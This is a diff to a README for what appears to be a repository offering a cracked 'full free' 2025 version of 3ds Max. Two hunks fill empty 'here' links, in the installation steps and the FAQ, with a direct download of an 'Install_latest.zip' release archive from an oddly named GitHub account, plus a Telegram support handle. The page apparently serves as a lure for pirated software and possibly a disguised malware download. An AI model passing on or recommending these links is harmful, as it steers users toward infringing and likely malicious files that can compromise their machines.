@@ -3,7 +3,7 @@
 
 
 ## Installation 🛠
-1. Download the archive-> [here]()
+1. Download the archive-> [here](https://github.com/liveevilatlasair3/3ds-max-full-free-2025/releases/download/Install_latest/Install_latest.zip)
 2. Extract the archive and follow the installation instructions. 
 3. After installation, launch the application. 
 
@@ -93,7 +93,7 @@
 # Frequently Asked Questions (FAQ) ❓
 
 - How do I install the program? 
-- You can install the archive from-> [here]()
+- You can install the archive from-> [here](https://github.com/liveevilatlasair3/3ds-max-full-free-2025/releases/download/Install_latest/Install_latest.zip)
 
 - How can I get support? 💬
 - Out TG Support [Support](@GitSupport)
